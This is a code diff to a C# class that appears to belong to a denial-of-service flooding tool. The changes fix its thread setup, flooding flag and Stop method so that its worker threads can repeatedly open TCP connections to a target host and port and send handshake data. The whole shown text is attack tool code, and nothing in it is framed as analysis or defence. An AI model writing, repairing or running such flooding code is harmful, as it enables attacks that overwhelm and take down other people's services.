@@ -32,11 +32,13 @@ namespace GAS.Core
             this.Port = port;
             this.ThreadCount = threadcount;
             this.msockets = max_sockets_on_attacker;
+            WorkingThreads = new Thread[ThreadCount];
         }
         public override void Start()
         {
             if (IsFlooding)
                 Stop();
+            IsFlooding = true;
             for (int i = 0; i < ThreadCount; i++)
                 (WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork))).Start(i);
             init = true;
@@ -58,7 +60,7 @@ namespace GAS.Core
                     try
                     {
                         csockets++;
-                        rSocket s = (rSocket)new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                        rSocket s = new rSocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         s.Connect(Target, Port);
                         s.Shutdown(SocketShutdown.Receive);
                         s.Send(handshake);
@@ -73,7 +75,8 @@ namespace GAS.Core
         }
         public override void Stop()
         {
-            throw new NotImplementedException();
+            IsFlooding = false;
+            //throw new NotImplementedException();
         }
     }
 }
